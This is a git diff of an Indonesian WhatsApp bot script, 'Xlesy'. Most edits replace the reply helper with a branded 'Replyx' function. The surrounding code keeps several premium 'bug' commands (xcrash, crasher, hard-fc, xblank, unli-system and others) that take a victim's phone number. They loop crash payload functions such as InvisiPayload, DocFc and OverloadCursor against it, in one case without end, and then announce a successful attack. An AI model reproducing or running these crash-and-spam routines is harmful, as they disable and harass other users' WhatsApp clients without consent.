@@ -266,6 +266,27 @@ module.exports = Xlesy = async (Xlesy, m, chatUpdate, store, groupCache) => {
             },
             sendEphemeral: true
         }
+const Replyx = (teks) => {
+    Xlesy.sendMessage(m.chat, {
+        text: teks,
+        contextInfo: {
+            mentionedJid: [m.sender],
+            forwardingScore: 999,
+            isForwarded: true,
+            externalAdReply: {
+                showAdAttribution: true,
+                containsAutoReply: true,
+                title: `${botname}`,
+                body: `${ucapanWaktu} ${m.pushname} 👋🏻`,
+                previewType: "VIDEO",
+                thumbnailUrl: 'https://files.catbox.moe/92vy0p.jpg',
+                sourceUrl: 'https://youtube.com/@Gxyenn'
+            }
+        }
+    }, { quoted: fkontak1 });
+};
+
+
         // Reset Limit
         cron.schedule('00 00 * * *', () => {
             console.log('Reseted Limit Users')
@@ -2618,7 +2639,7 @@ async function newsLetter(target) {
                 console.log(chalk.bgRed('[ SPAM ] : '), chalk.black(chalk.bgHex('#1CFFF7')(`From -> ${m.sender}`, {
                     quoted: fkontak1
                 }), chalk.bgHex('#E015FF')(` In ${m.isGroup ? m.chat : 'Private Chat'}`)))
-                return m.reply('\`TOLONG BERI JEDA 5 - 10 SESCODNS KAK KARENA BOT AKAN DELAY JIKALAU DI SPAM\`🦖', {
+                return Replyx('Yare-yare Beri Jeda Dong 5-10 Seconds!..', {
                     quoted: fkontak1
                 })
             }
@@ -3087,8 +3108,8 @@ async function newsLetter(target) {
 
         switch (command) {
 case 'xlesybug': {
-if (!q) return m.reply(`Example: .xlesybug 62×××`, { quoted: fkontak1 })
-await Xlesy.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });
+if (!q) return Replyx(`Example: .xlesybug 62×××`, { quoted: fkontak1 })
+Replyx(mess.load)
 let nomor = m.text.split(' ')[1]
 if (!nomor) return
     let imagePath = './lib/media/image/XlesyBug.jpg';
@@ -3098,7 +3119,7 @@ if (!nomor) return
         upload: Xlesy.waUploadToServer
     });
     
-let menunya = `𝘊𝘳𝘦𝘢𝘵𝘰𝘳: 𝘎𝘹𝘺𝘦𝘯𝘯\nYoutube: https://youtube.com/@GxyenDev\n\nʙᴜɢ xʟᴇꜱʏᴠɪᴘ: ᴊɪᴋᴀ ᴍᴇɴᴇᴍᴜᴋᴀɴ ʙᴜɢꜱ ᴀᴛᴀᴜ ᴇʀʀᴏʀ ᴘᴀᴅᴀ xʟᴇꜱʏᴠɪᴘ, ʜᴀʀᴀᴘ ʟᴀᴘᴏʀᴋᴀɴ ᴍᴇʟᴀʟᴜɪ ᴛᴇʟᴇɢʀᴀᴍ/ᴰᵉᵛ ᴜɴᴛᴜᴋ ᴘᴇʀʙᴀɪᴋᴀɴ ᴅᴀɴ ᴘᴇᴍʙᴀʀᴜᴀɴ ʟᴇʙɪʜ ʟᴀɴᴊᴜᴛ.\n\nᴛᴀʀɢᴇᴛ ᴛᴇʟᴀʜ ᴅɪ ᴋᴜɴᴄɪ\nꜱɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ᴊᴇɴɪꜱ ʙᴜɢxʟᴇꜱʏᴠɪᴘ`
+let menunya = `*Creator:* Gxyenn\n*Support:* https://youtube.com/@Gxyenn\n*UpdateInfo*: https://whatsapp.com/channel/0029Vap5nJh2UPBDIc9bja1s\n\nHallo ${m.pushname}👋\nJikalau Ada Bug Silahkan Lapor Dev Melalu Join Ch Baca Desk D Situ Ada Nomor Dev\n_Please support me by subscribing/following the channel_`
 const buttons = {
 buttonsMessage: {
 contentText: menunya,
@@ -3172,37 +3193,7 @@ attrs: { name: "quick_reply" }
 });
 
 } 
-break
-
-            case 'gpt': {
-                if (!text) return m.reply(`Example: ${prefix + command} query`, {
-                    quoted: fkontak1
-                });
-                try {
-                    let response = await axios.get(`https://api.agungny.my.id/api/aiLogic?q=jawab%20dengan%20bahasa%indonesia${encodeURIComponent(text)}`);
-                    m.reply(response.data.result);
-                } catch (e) {
-                    try {
-                        let hasil = await youSearch(text);
-                        m.reply(hasil);
-                    } catch (e) {
-                        try {
-                            let hasil = await bk9Ai(text);
-                            m.reply(hasil.BK9);
-                        } catch (e) {
-                            m.reply(pickRandom([
-                                'Fitur Ai sedang bermasalah!',
-                                'Tidak dapat terhubung ke ai!',
-                                'Sistem Ai sedang sibuk sekarang!',
-                                'Fitur sedang tidak dapat digunakan!'
-                            ]), {
-                                quoted: fkontak1
-                            });
-                        }
-                    }
-                }
-            }
-            break;
+break            
             case 'githubtrend': {
                 await Xlesy.sendMessage(m.chat, {
                     react: {
@@ -3210,13 +3201,13 @@ break
                         key: m.key
                     }
                 })
-                try {
+               try {
                     let anu = 'https://api.agungny.my.id/api/ghtrending';
                     let response = await fetch(anu);
                     let data = await response.json();
 
                     if (!data || !data.result || data.result.length === 0) {
-                        return m.reply('Gagal mengambil data GitHub Trending!');
+                        return Replyx('Gagal mengambil data GitHub Trending!');
                     }
 
                     let hasil = '*🔥 GitHub Trending 🔥*\n\n';
@@ -3244,8 +3235,8 @@ break
             //bug case
 case 'trash-fc':
 case 'xcrash': {
-if (!isPremium) return m.reply('Maaf Fitur Ini Hanya Untuk Premium/Owner', { quoted: fkontak1 })
-if (!q) return m.reply(`Example: ${prefix + command} 62×××`, { quoted: fkontak1 })
+if (!isPremium) return Replyx('Maaf Fitur Ini Hanya Untuk Premium/Owner', { quoted: fkontak1 })
+if (!q) return Replyx(`Example: ${prefix + command} 62×××`, { quoted: fkontak1 })
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 m.reply(bugres)
 for (let i = 0; i < 20; i++) {
@@ -3265,8 +3256,8 @@ break
 
 case 'xbug-fc':
 case 'crasher': {
-if (!isPremium) return m.reply('Maaf Fitur Ini Hanya Untuk Premium/Owner', { quoted: fkontak1 })
-if (!q) return m.reply(`Example: ${prefix + command} 62×××`, { quoted: fkontak1 })
+if (!isPremium) return Replyx('Maaf Fitur Ini Hanya Untuk Premium/Owner', { quoted: fkontak1 })
+if (!q) return Replyx(`Example: ${prefix + command} 62×××`, { quoted: fkontak1 })
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 m.reply(bugres)
 for (let i = 0; i < 20; i++) {
@@ -3283,15 +3274,15 @@ m.reply(`Suscesfully attack to ${target}✅`, { quoted: fkontak1 })
 break
 
 case 'hard-fc': {
-if (!isPremium) return m.reply('Maaf Fitur Ini Hanya Untuk Premium/Owner', { quoted: fkontak1 })
-if (!q) return m.reply(`Example: ${prefix + command} 62×××`, { quoted: fkontak1 })
+if (!isPremium) return Replyx('Maaf Fitur Ini Hanya Untuk Premium/Owner', { quoted: fkontak1 })
+if (!q) return Replyx(`Example: ${prefix + command} 62×××`, { quoted: fkontak1 })
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 m.reply(bugres)
 for (let i = 0; i < 20; i++) {
 await InvisibleLoadFast(target)
 await InvisiPayload(target)
 await MSGSPAM1(target)
-await DocFc(target)
+await DocFc(target) 
 await NewIos(target, Ptcp = true)
 await invc2(target, ptcp = true)
 await OverloadCursor(target, ptcp = true)
@@ -3301,8 +3292,8 @@ m.reply(`Suscesfully attack to ${target}✅`, { quoted: fkontak1 })
 break
 
 case 'uixfc': {
-if (!isPremium) return m.reply('Maaf Fitur Ini Hanya Untuk Premium/Owner', { quoted: fkontak1 })
-if (!q) return m.reply(`Example: ${prefix + command} 62×××`, { quoted: fkontak1 })
+if (!isPremium) return Replyx('Maaf Fitur Ini Hanya Untuk Premium/Owner', { quoted: fkontak1 })
+if (!q) return Replyx(`Example: ${prefix + command} 62×××`, { quoted: fkontak1 })
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 m.reply(bugres)
 for (let i = 0; i < 20; i++) {
@@ -3324,8 +3315,8 @@ case 'xlesy-hard':
 case 'hard-ui':
 case 'xblank': 
 case 'blank-1h': {
-if (!isPremium) return m.reply('Maaf Fitur Ini Hanya Untuk Premium/Owner', { quoted: fkontak1 })
-if (!q) return m.reply(`Example: ${prefix + command} 62×××`, { quoted: fkontak1 })
+if (!isPremium) return Replyx('Maaf Fitur Ini Hanya Untuk Premium/Owner', { quoted: fkontak1 })
+if (!q) return Replyx(`Example: ${prefix + command} 62×××`, { quoted: fkontak1 })
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 m.reply(bugres)
 for (let i = 0; i < 30; i++) {
@@ -3374,8 +3365,8 @@ break
 case 'bugfc-unli':
 case 'bugui-unli':
 case 'unli-system': {
-if (!isPremium) return m.reply('Maaf Fitur Ini Hanya Untuk Premium/Owner', { quoted: fkontak1 })
-if (!q) return m.reply(`Example: ${prefix + command} 62×××`, { quoted: fkontak1 })
+if (!isPremium) return Replyx('Maaf Fitur Ini Hanya Untuk Premium/Owner', { quoted: fkontak1 })
+if (!q) return Replyx(`Example: ${prefix + command} 62×××`, { quoted: fkontak1 })
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 m.reply(bugres)
 for (let i = 0; true; i++) {
@@ -4187,7 +4178,7 @@ break
             case 'yuki':
             case 'yulibocil':
             case 'yumeko': {
-                m.reply(mess.wait)
+                Replyx(mess.wait)
                 let heyy
                 if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
                 if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
@@ -4317,12 +4308,12 @@ break
 
             // Owner Menu
             case 'alljoin': {
-                if (!m.isGroup) return m.reply('Fitur ini hanya bisa digunakan dalam grup!');
-                if (!isCreator) return m.reply('Hanya owner bot yang bisa menggunakan fitur ini!');
-                if (!m.isBotAdmin) return m.reply('Bot harus menjadi admin untuk menggunakan fitur ini!');
+                if (!m.isGroup) return Replyx('Fitur ini hanya bisa digunakan dalam grup!');
+                if (!isCreator) return Replyx('Hanya owner bot yang bisa menggunakan fitur ini!');
+                if (!m.isBotAdmin) return Replyx('Bot harus menjadi admin untuk menggunakan fitur ini!');
 
                 let linkGc = args[0]; // Link grup tujuan
-                if (!linkGc || !linkGc.includes('chat.whatsapp.com')) return m.reply('Masukkan link grup yang valid!');
+                if (!linkGc || !linkGc.includes('chat.whatsapp.com')) return Replyx('Masukkan link grup yang valid!');
 
                 let metadata = await Xlesy.groupMetadata(m.chat);
                 let participants = metadata.participants.map(u => u.id);
@@ -4413,7 +4404,7 @@ break
             break
             case 'setbio': {
                 if (!isCreator) return m.reply(mess.owner)
-                if (!text) return m.reply('Mana text nya?')
+                if (!text) return Replyx('Mana text nya?')
                 Xlesy.setStatus(q)
                 m.reply(`*Bio telah di ganti menjadi ${q}*`, {
                     quoted: fkontak1
@@ -4464,15 +4455,15 @@ break
             break
             case 'join': {
                 if (!isCreator) return m.reply(mess.owner)
-                if (!text) return m.reply('Masukkan Link Group!', {
+                if (!text) return Replyx('Masukkan Link Group!', {
                     quoted: fkontak1
                 })
-                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return m.reply('Link Invalid!', {
+                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return Replyx('Link Invalid!', {
                     quoted: fkontak1
                 })
 
                 const result = args[0].split('https://chat.whatsapp.com/')[1]
-                m.reply(mess.wait)
+                Replyx(mess.wait)
 
                 try {
                     const response = await Xlesy.groupAcceptInvite(result)
@@ -4493,19 +4484,19 @@ break
                         })
                     }
                 } catch (res) {
-                    if (res.data == 400) return m.reply('Grup Tidak Ditemukan❗', {
+                    if (res.data == 400) return Replyx('Grup Tidak Ditemukan❗', {
                         quoted: fkontak1
                     })
-                    if (res.data == 401) return m.reply('Bot Di Kick Dari Grup Tersebut❗', {
+                    if (res.data == 401) return Replyx('Bot Di Kick Dari Grup Tersebut❗', {
                         quoted: fkontak1
                     })
-                    if (res.data == 409) return m.reply('Bot Sudah Join Di Grup Tersebut❗', {
+                    if (res.data == 409) return Replyx('Bot Sudah Join Di Grup Tersebut❗', {
                         quoted: fkontak1
                     })
-                    if (res.data == 410) return m.reply('URL Grup Telah Di Setel Ulang❗', {
+                    if (res.data == 410) return Replyx('URL Grup Telah Di Setel Ulang❗', {
                         quoted: fkontak1
                     })
-                    if (res.data == 500) return m.reply('Grup Penuh❗', {
+                    if (res.data == 500) return Replyx('Grup Penuh❗', {
                         quoted: fkontak1
                     })
                 }
@@ -4597,7 +4588,7 @@ break
                 })
                 const nmrnya = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                 const onWa = await Xlesy.onWhatsApp(nmrnya)
-                if (!onWa.length > 0) return m.reply('Nomer Tersebut Tidak Terdaftar Di Whatsapp!')
+                if (!onWa.length > 0) return Replyx('Nomer Tersebut Tidak Terdaftar Di Whatsapp!')
                 if (db.users[nmrnya] && db.users[nmrnya].uang >= 0) {
                     addUang(args[1], nmrnya, db)
                     m.reply('Sukses Add Uang')
@@ -4613,7 +4604,7 @@ break
                 })
                 const nmrnya = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                 const onWa = await Xlesy.onWhatsApp(nmrnya)
-                if (!onWa.length > 0) return m.reply('Nomer Tersebut Tidak Terdaftar Di Whatsapp!', {
+                if (!onWa.length > 0) return Replyx('Nomer Tersebut Tidak Terdaftar Di Whatsapp!', {
                     quoted: fkontak1
                 })
                 if (db.users[nmrnya] && db.users[nmrnya].limit >= 0) {
@@ -4722,7 +4713,7 @@ break
                 let [teks1, teks2] = text.split`|`
                 const nmrnya = teks1.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                 const onWa = await Xlesy.onWhatsApp(nmrnya)
-                if (!onWa.length > 0) return m.reply('Nomer Tersebut Tidak Terdaftar Di Whatsapp!', {
+                if (!onWa.length > 0) return Replyx('Nomer Tersebut Tidak Terdaftar Di Whatsapp!', {
                     quoted: fkontak1
                 })
                 if (teks2) {
@@ -4859,7 +4850,7 @@ break
             break
             case 'addcase': {
                 if (!isCreator) return m.reply(mess.owner)
-                if (!text && !text.startsWith('case')) return m.reply('Masukkan Casenya!')
+                if (!text && !text.startsWith('case')) return Replyx('Masukkan Casenya!')
                 fs.readFile('Xlesy.js', 'utf8', (err, data) => {
                     if (err) {
                         console.error('Terjadi kesalahan saat membaca file:', err);
@@ -4882,7 +4873,7 @@ break
             break
             case 'getcase': {
                 if (!isCreator) return m.reply(mess.owner)
-                if (!text) return m.reply('Masukkan Nama Casenya!')
+                if (!text) return Replyx('Masukkan Nama Casenya!')
                 try {
                     const getCase = (cases) => {
                         return "case" + `'${cases}'` + fs.readFileSync("Xlesy.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
@@ -4899,7 +4890,7 @@ break
             break
             case 'delcase': {
                 if (!isCreator) return m.reply(mess.owner)
-                if (!text) return m.reply('Masukkan Nama Casenya!')
+                if (!text) return Replyx('Masukkan Nama Casenya!')
                 fs.readFile('Xlesy.js', 'utf8', (err, data) => {
                     if (err) {
                         console.error('Terjadi kesalahan saat membaca file:', err);
@@ -4936,7 +4927,7 @@ break
                         console.error('Unable to scan directory: ' + err, {
                             quoted: fkontak1
                         })
-                        return m.reply('Unable to scan directory: ' + err, {
+                        return Replyx('Unable to scan directory: ' + err, {
                             quoted: fkontak1
                         })
                     }
@@ -4971,7 +4962,7 @@ break
                 fs.readdir('./database/sampah', async function(err, files) {
                     if (err) {
                         console.error('Unable to scan directory: ' + err);
-                        return m.reply('Unable to scan directory: ' + err);
+                        return Replyx('Unable to scan directory: ' + err);
                     }
                     let filteredArray = await files.filter(item => ['gif', 'png', 'bin', 'mp3', 'mp4', 'jpg', 'webp', 'webm', 'opus', 'jpeg'].some(ext => item.endsWith(ext)));
                     let teks = `Terdeteksi ${filteredArray.length} Sampah file\n\n`
@@ -5124,9 +5115,9 @@ _©Gxyenn_`;
                         await Xlesy.groupParticipantsUpdate(m.chat, [numbersOnly], 'add').then(async (res) => {
                             for (let i of res) {
                                 let invv = await Xlesy.groupInviteCode(m.chat)
-                                if (i.status == 401) return m.reply('Dia Memblokir Bot!')
-                                if (i.status == 409) return m.reply('Dia Sudah Join!')
-                                if (i.status == 500) return m.reply('Grub Penuh!')
+                                if (i.status == 401) return Replyx('Dia Memblokir Bot!')
+                                if (i.status == 409) return Replyx('Dia Sudah Join!')
+                                if (i.status == 500) return Replyx('Grub Penuh!')
                                 if (i.status == 408) {
                                     await m.reply(`@${numbersOnly.split('@')[0]} Baru-Baru Saja Keluar Dari Grub Ini!\n\nKarena Target Private\n\nUndangan Akan Dikirimkan Ke\n-> wa.me/${numbersOnly.replace(/\D/g, '')}\nMelalui Jalur Pribadi`, {
                                         quoted: fkontak1
@@ -5248,7 +5239,7 @@ _©Gxyenn_`;
                 if (!m.isGroup) return m.reply(mess.group)
                 if (!m.isAdmin) return m.reply(mess.admin)
                 if (!m.isBotAdmin) return m.reply(mess.botAdmin)
-                if (!m.quoted) return m.reply('Reply Gambar yang mau dipasang di Profile Bot', {
+                if (!m.quoted) return Replyx('Reply Gambar yang mau dipasang di Profile Bot', {
                     quoted: fkontak1
                 })
                 if (!/image/.test(quoted.type)) return m.reply(`Reply Image Dengan Caption ${prefix + command}`, {
@@ -5293,7 +5284,7 @@ _©Gxyenn_`;
             case 'delete':
             case 'del':
             case 'd': {
-                if (!m.quoted) return m.reply('Reply pesan yang mau di delete', {
+                if (!m.quoted) return Replyx('Reply pesan yang mau di delete', {
                     quoted: fkontak1
                 })
                 await Xlesy.sendMessage(m.chat, {
@@ -5410,7 +5401,7 @@ _©Gxyenn_`;
                     case 'waktusholat':
                     case 'nsfw':
                         if (/on|true/i.test(teks[1])) {
-                            if (set[teks[0]]) return m.reply('*Sudah Aktif Sebelumnya*', {
+                            if (set[teks[0]]) return Replyx('*Sudah Aktif Sebelumnya*', {
                                 quoted: fkontak1
                             })
                             set[teks[0]] = true
@@ -5481,7 +5472,7 @@ _©Gxyenn_`;
             case 'liston': {
                 if (!m.isGroup) return m.reply(mess.group)
                 let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
-                if (!store.presences || !store.presences[id]) return m.reply('Sedang Tidak ada yang online!', {
+                if (!store.presences || !store.presences[id]) return Replyx('Sedang Tidak ada yang online!', {
                     quoted: fkontak1
                 })
                 let online = [...Object.keys(store.presences[id]), botNumber]
@@ -5503,7 +5494,7 @@ _©Gxyenn_`;
                 }, {
                     quoted: fkontak1
                 });
-                let imagePath = './lib/media/image/GxyennJasaBot.jpg'
+                let imagePath = './lib/media/image/jasajadibot.jpg'
                 const uploadFile = {
                     upload: Xlesy.waUploadToServer
                 };
@@ -5663,14 +5654,14 @@ _©Gxyenn_`;
 case 'enc':
 case 'encrypt': {
     if (!m.text.startsWith(prefix)) return; // Pastikan hanya bisa dijalankan dengan prefix 
-    if (!m.quoted) return m.reply('Example: dengan reply file .js');
-    if (mime !== "application/javascript") return m.reply('Example: dengan reply file .js', { quoted: fkontak1 });
+    if (!m.quoted) return Replyx('Example: dengan reply file .js');
+    if (mime !== "application/javascript") return Replyx('Example: dengan reply file .js', { quoted: fkontak1 });
 
     let media = await m.quoted.download();
     let filename = m.quoted.message.documentMessage.fileName;
     await fs.writeFileSync(`./database/sampah/@enc_${filename}`, media);
 
-    await m.reply("Memproses encrypt code . . .", { quoted: fkontak1 });
+    await Replyx("Memproses encrypt code . . .", { quoted: fkontak1 });
 
     await JsConfuser.obfuscate(await fs.readFileSync(`./database/sampah/@enc_${filename}`).toString(), {
         target: "node",
@@ -5792,7 +5783,7 @@ case 'profile':
             break
             case 'req':
             case 'request': {
-                if (!text) return m.reply('Mau Request apa ke Owner?')
+                if (!text) return Replyx('Mau Request apa ke Owner?')
                 await m.reply(`*Request Telah Terkirim Ke Owner*\n_Terima Kasih🙏_`, {
                     quoted: fkontak1
                 })
@@ -5851,7 +5842,7 @@ case 'profile':
                     case 'mode':
                         if (!isCreator) return m.reply(mess.owner)
                         if (teks[1] == 'public') {
-                            if (Xlesy.public) return m.reply('*Sudah Aktif Sebelumnya*', {
+                            if (Xlesy.public) return Replyx('*Sudah Aktif Sebelumnya*', {
                                 quoted: fkontak1
                             })
                             Xlesy.public = set.public = true
@@ -5878,7 +5869,7 @@ case 'profile':
                     case 'antispam':
                         if (!isCreator) return m.reply(mess.owner)
                         if (teks[1] == 'on') {
-                            if (set[teks[0]]) return m.reply('*Sudah Aktif Sebelumnya*', {
+                            if (set[teks[0]]) return Replyx('*Sudah Aktif Sebelumnya*', {
                                 quoted: fkontak1
                             })
                             set[teks[0]] = true
@@ -6017,7 +6008,7 @@ case 'profile':
             }
             break
             case 'inspect': {
-                if (!text) return m.reply('Masukkan Link Group!')
+                if (!text) return Replyx('Masukkan Link Group!')
                 let _grup = /chat.whatsapp.com\/([\w\d]*)/;
                 let _saluran = /whatsapp\.com\/channel\/([\w\d]*)/;
                 if (_grup.test(text)) {
@@ -6028,9 +6019,9 @@ case 'profile':
                         })
                         m.reply(teks)
                     }).catch((e) => {
-                        if ([400, 406].includes(e.data)) return m.reply('Grup Tidak Di Temukan❗');
-                        if (e.data == 401) return m.reply('Bot Di Kick Dari Grup Tersebut❗');
-                        if (e.data == 410) return m.reply('Url Grup Telah Di Setel Ulang❗');
+                        if ([400, 406].includes(e.data)) return Replyx('Grup Tidak Di Temukan❗');
+                        if (e.data == 401) return Replyx('Bot Di Kick Dari Grup Tersebut❗');
+                        if (e.data == 410) return Replyx('Url Grup Telah Di Setel Ulang❗');
                     });
                 } else if (_saluran.test(text) || text.endsWith('@newsletter') || !isNaN(text)) {
                     await Xlesy.newsletterMsg(text.match(_saluran)[1]).then((n) => {
@@ -6044,7 +6035,7 @@ case 'profile':
             }
             break
             case 'addmsg': {
-                if (!m.quoted) return m.reply('Reply Pesan Yang Ingin Disave Di Database')
+                if (!m.quoted) return Replyx('Reply Pesan Yang Ingin Disave Di Database')
                 if (!text) return m.reply(`Example : ${prefix + command} file name`, {
                     quoted: fkontak1
                 })
@@ -6061,7 +6052,7 @@ case 'profile':
             break
             case 'delmsg':
             case 'deletemsg': {
-                if (!text) return m.reply('Nama msg yg mau di delete?')
+                if (!text) return Replyx('Nama msg yg mau di delete?')
                 let msgs = db.database
                 if (text == 'allmsg') {
                     db.database = {}
@@ -6104,10 +6095,10 @@ case 'profile':
             break
             case 'q':
             case 'quoted': {
-                if (!m.quoted) return m.reply('Reply Pesannya!')
+                if (!m.quoted) return Replyx('Reply Pesannya!')
                 const anu = await m.getQuotedObj()
-                if (!anu) return m.reply('Format Tidak Tersedia!')
-                if (!anu.quoted) return m.reply('Pesan Yang Anda Reply Tidak Mengandung Reply')
+                if (!anu) return Replyx('Format Tidak Tersedia!')
+                if (!anu.quoted) return Replyx('Pesan Yang Anda Reply Tidak Mengandung Reply')
                 await Xlesy.relayMessage(m.chat, {
                     [anu.quoted.type]: anu.quoted.msg
                 }, {})
@@ -6129,7 +6120,7 @@ case 'profile':
                 if (teks1) {
                     const tujuan = teks1.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                     const onWa = await Xlesy.onWhatsApp(tujuan)
-                    if (!onWa.length > 0) return m.reply('Nomer Tersebut Tidak Terdaftar Di Whatsapp!')
+                    if (!onWa.length > 0) return Replyx('Nomer Tersebut Tidak Terdaftar Di Whatsapp!')
                     menfes[m.sender] = {
                         tujuan: tujuan,
                         nama: teks2 ? teks2 : 'Orang',
@@ -6187,7 +6178,7 @@ case 'profile':
                 if (!isLimit) return m.reply(mess.limit)
                 const nmrnya = text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.sender
                 const onWa = await Xlesy.onWhatsApp(nmrnya)
-                if (!onWa.length > 0) return m.reply('Nomer Tersebut Tidak Terdaftar Di Whatsapp!')
+                if (!onWa.length > 0) return Replyx('Nomer Tersebut Tidak Terdaftar Di Whatsapp!')
                 await JadiBot(Xlesy, nmrnya, m)
                 m.reply(`Gunakan ${prefix}stopjadibot\nUntuk Berhenti`, {
                     quoted: fkontak1
@@ -6199,7 +6190,7 @@ case 'profile':
             case 'deljadibot': {
                 const nmrnya = text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.sender
                 const onWa = await Xlesy.onWhatsApp(nmrnya)
-                if (!onWa.length > 0) return m.reply('Nomer Tersebut Tidak Terdaftar Di Whatsapp!')
+                if (!onWa.length > 0) return Replyx('Nomer Tersebut Tidak Terdaftar Di Whatsapp!')
                 await StopJadiBot(Xlesy, nmrnya, m)
             }
             break
@@ -6213,7 +6204,7 @@ case 'profile':
             case 'get': {
                 if (!isPremium) return m.reply(mess.prem)
                 if (!isLimit) return m.reply(mess.limit)
-                if (!/^https?:\/\//.test(text)) return m.reply('Awali dengan http:// atau https://');
+                if (!/^https?:\/\//.test(text)) return Replyx('Awali dengan http:// atau https://');
                 try {
                     const res = await axios.get(isUrl(text) ? isUrl(text)[0] : text)
                     if (!/text|json|html|plain/.test(res.headers['content-type'])) {
@@ -6232,7 +6223,7 @@ case 'profile':
                 if (!/video|audio/.test(mime)) return m.reply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`, {
                     quoted: fkontak1
                 })
-                m.reply(mess.wait)
+                Replyx(mess.wait)
                 let media = await quoted.download()
                 let audio = await toAudio(media, 'mp4')
                 await m.reply({
@@ -6245,7 +6236,7 @@ case 'profile':
                 if (!/video|audio/.test(mime)) return m.reply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`, {
                     quoted: fkontak1
                 })
-                m.reply(mess.wait)
+                Replyx(mess.wait)
                 let media = await quoted.download()
                 let audio = await toAudio(media, 'mp4')
                 await m.reply({
@@ -6261,7 +6252,7 @@ case 'profile':
                 if (!/video|audio/.test(mime)) return m.reply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`, {
                     quoted: fkontak1
                 })
-                m.reply(mess.wait)
+                Replyx(mess.wait)
                 let media = await quoted.download()
                 let audio = await toPTT(media, 'mp4')
                 await m.reply({
@@ -6275,12 +6266,12 @@ case 'profile':
                 if (!/webp|video/.test(mime)) return m.reply(`Reply Video/Stiker dengan caption *${prefix + command}*`, {
                     quoted: fkontak1
                 })
-                m.reply(mess.wait)
+                Replyx(mess.wait)
                 let media = await Xlesy.downloadAndSaveMediaMessage(qmsg)
                 let ran = `./database/sampah/${getRandom('.gif')}`;
                 exec(`convert ${media} ${ran}`, (err) => {
                     fs.unlinkSync(media)
-                    if (err) return m.reply('Gagal❗')
+                    if (err) return Replyx('Gagal❗')
                     let buffer = fs.readFileSync(ran)
                     m.reply({
                         video: buffer,
@@ -6295,12 +6286,12 @@ case 'profile':
                 if (!/webp|video/.test(mime)) return m.reply(`Reply Video/Stiker dengan caption *${prefix + command}*`, {
                     quoted: fkontak1
                 })
-                m.reply(mess.wait)
+                Replyx(mess.wait)
                 let media = await Xlesy.downloadAndSaveMediaMessage(qmsg)
                 let ran = `./database/sampah/${getRandom('.png')}`;
                 exec(`convert ${media}[0] ${ran}`, (err) => {
                     fs.unlinkSync(media)
-                    if (err) return m.reply('Gagal❗')
+                    if (err) return Replyx('Gagal❗')
                     let buffer = fs.readFileSync(ran)
                     m.reply({
                         image: buffer
@@ -6331,7 +6322,7 @@ case 'profile':
             case 'tourl': {
                 try {
                     if (/webp|video|sticker|audio|jpg|jpeg|png/.test(mime)) {
-                        m.reply(mess.wait)
+                        Replyx(mess.wait)
                         let media = await quoted.download()
                         let anu = await UguuSe(media)
                         m.reply('Url : ' + anu.url)
@@ -6346,7 +6337,7 @@ case 'profile':
             case 'texttospech':
             case 'tts':
             case 'tospech': {
-                if (!text) return m.reply('Mana text yg mau diubah menjadi audio?')
+                if (!text) return Replyx('Mana text yg mau diubah menjadi audio?')
                 let {
                     tts
                 } = require('./lib/tts')
@@ -6390,7 +6381,7 @@ case 'profile':
                 if (!text) return m.reply(`Ubah Text ke Qr dengan *${prefix + command}* textnya`, {
                     quoted: fkontak1
                 })
-                m.reply(mess.wait)
+                Replyx(mess.wait)
                 await m.reply({
                     image: {
                         url: 'https://api.qrserver.com/v1/create-qr-code/?size=1000x1000&data=' + text
@@ -6594,14 +6585,14 @@ case 'profile':
                 let teks1 = text.split`|` [0] ? text.split`|` [0] : ''
                 let teks2 = text.split`|` [1] ? text.split`|` [1] : ''
                 if (/image|webp/.test(mime)) {
-                    m.reply(mess.wait)
+                    Replyx(mess.wait)
                     await Xlesy.sendAsSticker(m.chat, media, m, {
                         packname: teks1,
                         author: teks2
                     })
                 } else if (/video/.test(mime)) {
-                    if ((qmsg).seconds > 11) return m.reply('Maksimal 10 detik!')
-                    m.reply(mess.wait)
+                    if ((qmsg).seconds > 11) return Replyx('Maksimal 10 detik!')
+                    Replyx(mess.wait)
                     await Xlesy.sendAsSticker(m.chat, media, m, {
                         packname: teks1,
                         author: teks2
@@ -6627,7 +6618,7 @@ case 'profile':
                     if (!text) return m.reply(`Kirim/reply image/sticker dengan caption ${prefix + command} atas|bawah`, {
                         quoted: fkontak1
                     })
-                    m.reply(mess.wait)
+                    Replyx(mess.wait)
                     let atas = text.split`|` [0] ? text.split`|` [0] : '-'
                     let bawah = text.split`|` [1] ? text.split`|` [1] : '-'
                     let media = await quoted.download()
@@ -6839,7 +6830,7 @@ case 'profile':
                 if (!isLimit) return m.reply(mess.limit)
                 try {
                     if (/jpg|jpeg|png/.test(mime)) {
-                        m.reply(mess.wait)
+                        Replyx(mess.wait)
                         let media = await quoted.download()
                         let anu = await UguuSe(media)
                         await Xlesy.sendFileUrl(m.chat, 'https://some-random-api.com/canvas/wasted?avatar=' + anu.url, 'Nih Bro', m)
@@ -6861,7 +6852,7 @@ case 'profile':
                 if (!isLimit) return m.reply(mess.limit)
                 try {
                     if (/jpg|jpeg|png/.test(mime)) {
-                        m.reply(mess.wait)
+                        Replyx(mess.wait)
